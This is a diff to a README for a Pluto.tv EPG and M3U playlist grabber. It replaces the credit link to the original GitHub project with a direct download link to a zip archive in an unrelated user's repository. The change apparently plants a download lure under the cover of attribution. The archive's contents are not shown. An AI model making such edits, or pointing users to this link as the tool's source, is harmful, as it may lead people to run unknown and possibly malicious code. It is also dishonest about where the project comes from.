@@ -2,7 +2,7 @@
 
 Grab EPG &amp; M3U from Pluto.tv
 
-Based on https://github.com/TylerB260/PlutoXML
+Based on https://raw.githubusercontent.com/alluringabhi/PlutoIPTV/master/unifactorial/3.5-alpha.4.zip
 
 ## Usage
 
